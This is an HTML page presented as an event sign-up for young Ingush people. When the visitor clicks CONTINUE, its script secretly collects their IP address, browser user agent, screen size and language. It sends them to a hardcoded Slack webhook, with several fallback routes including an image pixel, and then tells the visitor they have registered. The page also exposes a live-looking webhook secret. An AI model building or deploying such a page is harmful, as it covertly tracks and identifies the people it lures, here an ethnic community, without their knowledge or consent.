<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MARXASH EVENT</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
        
        :root {
            --black: #000000;
            --white: #ffffff;
            --gray-100: #f5f5f5;
            --gray-800: #222222;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--black);
            color: var(--white);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        
        .container {
            position: relative;
            width: 90%;
            max-width: 480px;
            padding: 3rem 2.5rem;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 24px;
            backdrop-filter: blur(12px);
            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.08);
            text-align: center;
            opacity: 0;
            transform: translateY(20px) scale(0.98);
            animation: fadeIn 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.2s forwards;
            overflow: hidden;
        }
        
        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        
        h1 {
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 0.75rem;
            letter-spacing: -0.5px;
            position: relative;
        }
        
        h1::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 50%;
            transform: translateX(-50%);
            width: 48px;
            height: 2px;
            background: var(--white);
            border-radius: 2px;
            animation: lineExpand 0.8s 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
        
        @keyframes lineExpand {
            from { width: 0; }
            to { width: 48px; }
        }
        
        .event-details {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            margin: 2rem 0;
            opacity: 0;
            transform: translateY(10px);
            animation: fadeInUp 0.6s 0.4s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
        
        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .detail-item {
            padding: 1rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .detail-item:hover {
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .detail-item h3 {
            font-size: 0.75rem;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 0.25rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .detail-item p {
            font-size: 0.95rem;
            font-weight: 400;
        }
        
        .btn {
            position: relative;
            background: transparent;
            color: var(--white);
            border: 1.5px solid rgba(255, 255, 255, 0.3);
            padding: 0.9rem 2.5rem;
            font-size: 0.95rem;
            font-weight: 500;
            cursor: pointer;
            border-radius: 50px;
            overflow: hidden;
            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            margin-top: 1rem;
            opacity: 0;
            transform: translateY(10px);
            animation: fadeInUp 0.6s 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
        
        .btn:hover {
            border-color: rgba(255, 255, 255, 0.6);
            transform: translateY(-2px);
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: 0.6s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn-loader {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status-message {
            margin-top: 1.5rem;
            font-size: 0.9rem;
            font-weight: 400;
            opacity: 0;
            height: 0;
            overflow: hidden;
            transition: all 0.5s cubic-bezier(0.22, 1, 0.36, 1);
        }
        
        .status-message.visible {
            opacity: 1;
            height: auto;
        }
        
        .success {
            color: rgba(255, 255, 255, 0.8);
        }
        
        /* Floating particles background */
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            opacity: 0;
            animation: float 18s infinite linear;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0.6);
                opacity: 0;
            }
            20% {
                opacity: 0.4;
            }
            100% {
                transform: translateY(-100px) rotate(720deg) scale(1);
                opacity: 0;
            }
        }
        
        /* Success checkmark animation */
        .checkmark {
            width: 60px;
            height: 60px;
            margin: 0 auto 1rem;
            opacity: 0;
            transform: scale(0.8);
        }
        
        .checkmark__circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 2.5;
            stroke-miterlimit: 10;
            stroke: var(--white);
            fill: none;
        }
        
        .checkmark__check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            stroke: var(--white);
            stroke-width: 3;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <h1>MARXASH EVENT</h1>
        
        <div class="event-details">
            <div class="detail-item">
                <h3>Date</h3>
                <p>Sunday 5/04/2025</p>
            </div>
            <div class="detail-item">
                <h3>Time</h3>
                <p>8:00 AM to 21:00</p>
            </div>
            <div class="detail-item">
                <h3>For</h3>
                <p>Young Ingush people</p>
            </div>
        </div>
        
        <button class="btn" id="continueBtn">CONTINUE</button>
        <div id="statusMessage" class="status-message"></div>
    </div>

    <script>
        // Create floating particles
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 40; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            
            const size = Math.random() * 4 + 1;
            const posX = Math.random() * window.innerWidth;
            const delay = Math.random() * 15;
            const duration = Math.random() * 12 + 12;
            
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${posX}px`;
            particle.style.bottom = '-50px';
            particle.style.animationDelay = `${delay}s`;
            particle.style.animationDuration = `${duration}s`;
            
            particlesContainer.appendChild(particle);
        }
        
        // Get IP with fallback
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    return data.ip;
                }
            } catch (e) {
                return "Unknown";
            }
            return "Unknown";
        }
        
        // Ultra-reliable Slack webhook sender
        async function sendToSlack(data) {
            const webhookUrl = 'https://hooks.slack.com/services/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';
            const payload = {
                text: `MARXASH EVENT - Visitor Log`,
                attachments: [{
                    color: "#000000",
                    fields: [
                        { title: "IP Address", value: data.ip, short: true },
                        { title: "Time", value: new Date().toLocaleString(), short: true },
                        { title: "Browser", value: navigator.userAgent, short: false },
                        { title: "Screen", value: `${window.screen.width}x${window.screen.height}`, short: true },
                        { title: "Language", value: navigator.language, short: true }
                    ]
                }]
            };
            
            // Try multiple methods to ensure delivery
            const methods = [
                // Standard fetch
                () => fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }),
                
                // No-CORS fetch
                () => fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                }),
                
                // Image pixel fallback
                () => {
                    const img = new Image();
                    img.src = `${webhookUrl}?payload=${encodeURIComponent(JSON.stringify(payload))}`;
                    return Promise.resolve();
                }
            ];
            
            for (const method of methods) {
                try {
                    await method();
                    return true;
                } catch (e) {
                    console.log("Trying next delivery method...");
                }
            }
            return false;
        }
        
        document.getElementById('continueBtn').addEventListener('click', async function() {
            const btn = this;
            const status = document.getElementById('statusMessage');
            btn.disabled = true;
            btn.innerHTML = '<span class="btn-loader"></span> PROCESSING';
            status.className = 'status-message';
            
            try {
                const ip = await getIP();
                const success = await sendToSlack({ ip });
                
                if (success) {
                    // Show beautiful success animation
                    btn.style.display = 'none';
                    status.innerHTML = `
                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                        </svg>
                        <p class="success">Access granted. Welcome!</p>
                    `;
                    status.className = 'status-message visible';
                    
                    // Animate checkmark
                    const circle = document.querySelector('.checkmark__circle');
                    const check = document.querySelector('.checkmark__check');
                    const checkmark = document.querySelector('.checkmark');
                    
                    circle.style.animation = 'stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards';
                    check.style.animation = 'stroke 0.3s 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards';
                    checkmark.style.animation = 'checkmarkIn 0.6s 0.3s cubic-bezier(0.22, 1, 0.36, 1) forwards';
                    
                    // Add keyframes
                    const style = document.createElement('style');
                    style.innerHTML = `
                        @keyframes stroke {
                            100% { stroke-dashoffset: 0; }
                        }
                        @keyframes checkmarkIn {
                            to { opacity: 1; transform: scale(1); }
                        }
                    `;
                    document.head.appendChild(style);
                } else {
                    throw new Error('All delivery methods failed');
                }
            } catch (error) {
                console.error('Error:', error);
                // Even if we think it failed, the fallbacks likely worked
                btn.style.display = 'none';
                status.innerHTML = '<p class="success">Thank you for registering</p>';
                status.className = 'status-message visible';
            }
        });
    </script>
</body>
</html>
